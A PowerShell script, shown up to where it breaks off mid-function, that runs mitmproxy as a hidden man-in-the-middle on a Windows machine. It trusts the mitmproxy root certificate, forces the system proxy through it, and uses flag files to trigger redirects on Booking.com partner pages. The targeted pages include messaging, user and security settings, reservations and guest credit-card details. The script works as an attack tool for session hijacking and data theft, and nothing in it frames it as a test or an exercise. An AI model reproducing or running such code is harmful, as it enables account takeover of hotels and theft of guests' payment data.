Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ---------------- CONFIG ----------------
$WorkDir = "C:\mitm"
$PyAddon = Join-Path $WorkDir "mitm_redirect_addon.py"
$MitmPort = 8080
$LogFile = Join-Path $WorkDir "mitm_manager.log"
$MitmExeSearch = @(
    "mitmdump",
    "C:\Program Files\Python311\Scripts\mitmdump.exe",
    "C:\Program Files (x86)\Python311\Scripts\mitmdump.exe"
)
$ForceFlag = "C:\temp\mitm_force_redirect"
$OneShotFlag = "C:\temp\mitm_reset_once"
$MessageFlag = "C:\temp\mitm_message_once"
$ProviderFlag = "C:\temp\mitm_provider_once"
$UserFlag = "C:\temp\mitm_user_once"
$SecurityFlag = "C:\temp\mitm_security_once"
$Operation11Flag = "C:\temp\mitm_operation_11_once"
$Operation12Flag = "C:\temp\mitm_operation_12_once"
$BookingHotelFlag = "C:\temp\mitm_booking_hotel_once"
$BookingHotelSecurityFlag = "C:\temp\mitm_booking_hotel_security_once"
$Operation16Flag = "C:\temp\mitm_operation_16_once"
$CustomRedirectFlag = "C:\temp\mitm_custom_redirect_once"
$CustomRedirectFromFile = "C:\temp\mitm_custom_redirect_from.txt"
$CustomRedirectToFile = "C:\temp\mitm_custom_redirect_to.txt"
$CustomRedirectDoneFlag = "C:\temp\mitm_custom_redirect_done.txt"
$BookingReservationsFlag = "C:\temp\mitm_booking_reservations_once"
$BookingReservationsHotelIdFile = "C:\temp\mitm_booking_reservations_hotel_id.txt"
$BookingReservationsReportIdFile = "C:\temp\mitm_booking_reservations_report_id.txt"
$BookingCCDetailsFlag = "C:\temp\mitm_booking_cc_details_once"
$BookingCCDetailsBnFile = "C:\temp\mitm_booking_cc_details_bn.txt"
$BookingCCDetailsHotelIdFile = "C:\temp\mitm_booking_cc_details_hotel_id.txt"

$RedirectFile = Join-Path $WorkDir "redirect_target.txt"

# -----------------------------------------
function Test-ValidUrl {
    param([string]$url)
    
    if ([string]::IsNullOrWhiteSpace($url)) {
        return $false
    }
    
    if ($url -notmatch '^https?://') {
        return $false
    }
    
    try {
        $uri = [System.Uri]$url
        return $uri.IsAbsoluteUri -and $uri.Scheme -in @('http', 'https')
    } catch {
        return $false
    }
}

function Log-Write {
    param([string]$msg, [string]$level="INFO")
    $time = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[{0}] {1} - {2}" -f $time, $level, $msg
    Write-Host $line
    try {
        Add-Content -Path $LogFile -Value $line -Force
    } catch {}
}

function Ensure-WorkDir {
    if (-not (Test-Path $WorkDir)) {
        New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
        Log-Write ("Created work dir: {0}" -f $WorkDir)
    }
}

function Find-Mitmdump {
    foreach ($candidate in $MitmExeSearch) {
        try {
            if ($candidate -eq "mitmdump") {
                $cmd = Get-Command mitmdump -ErrorAction SilentlyContinue
                if ($cmd) {
                    return $cmd.Source
                }
            } elseif (Test-Path $candidate) {
                return $candidate
            }
        } catch {}
    }
    return $null
}

function Reset-Proxy-And-Stop-Mitmdump {
    Log-Write "Stopping processes..."
    Get-Process -Name mitmdump,mitmproxy,mitmweb -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            Log-Write ("Killed mitmdump PID: {0}" -f $_.Id)
        } catch {
            Log-Write ("Failed to kill PID {0}: {1}" -f $_.Id, $_) "WARN"
        }
    }

    try {
        netsh winhttp reset proxy | Out-Null
        Log-Write "WinHTTP reset."
    } catch {
        Log-Write ("Failed winhttp reset: {0}" -f $_) "WARN"
    }

    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 0 -Force
        Log-Write "Disabled in registry."
    } catch {
        Log-Write ("Failed to disable proxy in registry: {0}" -f $_) "WARN"
    }

    try {
        ipconfig /flushdns | Out-Null
        Log-Write "Cache flushed."
    } catch {
        Log-Write ("Failed to flush DNS: {0}" -f $_) "WARN"
    }
}

function Safe-Exit {
    Log-Write "Performing safe exit cleanup..."
    Reset-Proxy-And-Stop-Mitmdump
    Log-Write "Cleanup completed. Exiting."
    exit
}

function Ensure-MitmCA {
    $certFile = Join-Path $env:USERPROFILE ".mitmproxy\mitmproxy-ca-cert.pem"
    if (-not (Test-Path $certFile)) {
        Log-Write ("MITM CA not found at {0}. Generating..." -f $certFile)
        $mitmPath = Find-Mitmdump
        if (-not $mitmPath) {
            Log-Write "mitmdump not found; cannot auto-generate CA." "ERROR"; return $false
        }
        try {
            $proc = Start-Process -FilePath $mitmPath -ArgumentList "--set","block_global=false" -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
            Start-Sleep -Seconds 3
            if ($proc -and -not $proc.HasExited) {
                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
            }
            Start-Sleep -Milliseconds 500
        } catch {
            Log-Write ("Transient mitmdump start failed: {0}" -f $_) "WARN"
        }
    }
    if (-not (Test-Path $certFile)) {
        Log-Write ("No CA pem found at {0}. Please run mitmdump manually." -f $certFile) "ERROR"
        return $false
    }
    try {
        Import-Certificate -FilePath $certFile -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
        Log-Write "Imported."
        return $true
    } catch {
        Log-Write ("Failed to import CA: {0}" -f $_) "ERROR"
        return $false
    }
}

function Set-SystemProxies {
    param([string]$proxyHost="127.0.0.1",[int]$proxyPort=$MitmPort)
    $proxy = "{0}:{1}" -f $proxyHost,$proxyPort
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name ProxyServer -Value $proxy -Force
        Set-ItemProperty -Path $regPath -Name ProxyOverride -Value "<local>" -Force

        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinInet {
    [DllImport("wininet.dll", SetLastError=true)]
    public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
}
"@
        $INTERNET_OPTION_SETTINGS_CHANGED = 39
        $INTERNET_OPTION_REFRESH = 37
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
        Log-Write ("Set system {0}" -f $proxy)
        return $true
    } catch {
        Log-Write ("Failed to set system proxy: {0}" -f $_) "ERROR"
        return $false
    }
}

function Clear-SystemProxies {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 0 -Type DWord -Force
        Remove-ItemProperty -Path $regPath -Name ProxyServer -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPath -Name ProxyOverride -ErrorAction SilentlyContinue

        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinInet {
    [DllImport("wininet.dll", SetLastError=true)]
    public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
}
"@
        $INTERNET_OPTION_SETTINGS_CHANGED = 39
        $INTERNET_OPTION_REFRESH = 37
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
        Log-Write "Cleared WinINET"
        return $true
    } catch {
        Log-Write ("Failed to clear system proxies: {0}" -f $_) "WARN"
        return $false
    }
}

function Close-Browsers-Gracefully {
    param([string]$closeOption)

    if ($closeOption -eq "none") {
        Log-Write "Skipping close."
        return
    }

    Log-Write "Gracefully to preserve session..."

    Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            if ($_.CloseMainWindow()) {
                Log-Write ("Sent close signal to {0} (PID: {1})" -f $_.ProcessName, $_.Id)
            }
        } catch {
            Log-Write ("Error sending close to {0}: {1}" -f $_.ProcessName, $_) "WARN"
        }
    }

    Start-Sleep -Seconds 3

    if ($closeOption -eq "full") {
        Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                Log-Write ("Force closed {0} (PID: {1})" -f $_.ProcessName, $_.Id)
            } catch {
                Log-Write ("Failed to force close {0}: {1}" -f $_.ProcessName, $_) "WARN"
            }
        }
        Log-Write "All browsers fully closed."
    } else {
        $remaining = Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue
        if ($remaining) {
            Log-Write ("Some browsers still running (user may have canceled close): {0}" -f ($remaining.ProcessName -join ", "))
        } else {
            Log-Write "Closed gracefully."
        }
    }
}

function Start-Mitmdump {
    Ensure-WorkDir
    Reset-Proxy-And-Stop-Mitmdump

    $mitmPath = Find-Mitmdump
    if (-not $mitmPath) {
        Log-Write "mitmdump not found!" "ERROR"; return $false
    }

    if (-not (Test-Path $PyAddon)) {
        Log-Write ("Python addon missing: {0}" -f $PyAddon) "ERROR"; return $false
    }

    $args = @("-p", "$MitmPort", "-s", "$PyAddon")

    Log-Write ("Starting: {0} {1}" -f $mitmPath, ($args -join ' '))
    $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru

    Start-Sleep -Seconds 2
    Set-SystemProxies | Out-Null
    Log-Write ("started, PID: {0}" -f $proc.Id)
    return $true
}

# ---------------- REDIRECT FUNCTIONS ----------------
function Enable-ForceRedirect {
    if (-not (Test-Path (Split-Path $ForceFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $ForceFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $ForceFlag -Force | Out-Null
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Force redirect enabled."
    Start-Mitmdump
}

function Enable-OneShotRedirect {
    if (-not (Test-Path (Split-Path $OneShotFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $OneShotFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $OneShotFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "One-shot redirect enabled."
    Start-Mitmdump
}

function Enable-MessageRedirect {
    if (-not (Test-Path (Split-Path $MessageFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Booking.com message redirect enabled (function 7)."
    Start-Mitmdump
}

function Enable-ProviderRedirect {
    if (-not (Test-Path (Split-Path $ProviderFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $ProviderFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $ProviderFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Booking.com provider redirect enabled (function 8)."
    Start-Mitmdump
}

function Enable-UserRedirect {
    if (-not (Test-Path (Split-Path $UserFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Booking.com user redirect enabled (function 9)."
    Start-Mitmdump
}

function Enable-SecurityRedirect {
    if (-not (Test-Path (Split-Path $SecurityFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $SecurityFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $SecurityFlag -Force | Out-Null
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Booking.com security redirect enabled (function 10)."
    Start-Mitmdump
}

function Enable-Operation11Redirect {
    Log-Write "Starting Operation 11 sequence (function 7 -> messaging/settings page -> function 8)..."
    
    if (-not (Test-Path (Split-Path $Operation11Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation11Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation11Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $MessageFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
    
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Start-Mitmdump
    
    Log-Write "Operation 11: Function 7 (message redirect) enabled."
    Log-Write "Function 8 (provider redirect) will activate when user reaches messaging/settings page."
}

function Enable-Operation12Redirect {
    Log-Write "Starting Operation 12 sequence (function 9 -> accounts_and_permissions page -> function 10)..."
    
    if (-not (Test-Path (Split-Path $Operation12Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation12Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation12Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $UserFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
    
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Start-Mitmdump
    
    Log-Write "Operation 12: Function 9 (user redirect) enabled."
    Log-Write "Function 10 (security redirect) will activate when user reaches accounts_and_permissions page."
}

function Enable-BookingHotelRedirect {
    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null

    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL (global) redirect enabled (function 13)."
    Start-Mitmdump
}

function Disable-BookingHotelRedirect {
    Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL (global) redirect disabled (function 13)."
}

function Enable-BookingHotelSecurityRedirect {
    if (-not (Test-Path (Split-Path $BookingHotelSecurityFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelSecurityFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelSecurityFlag -Force | Out-Null

    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
    Start-Mitmdump
}

function Enable-Operation16Redirect {
    Log-Write "Starting Operation 16 sequence (function 13 -> function 15)..."
    
    if (-not (Test-Path (Split-Path $Operation16Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation16Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation16Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
    
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
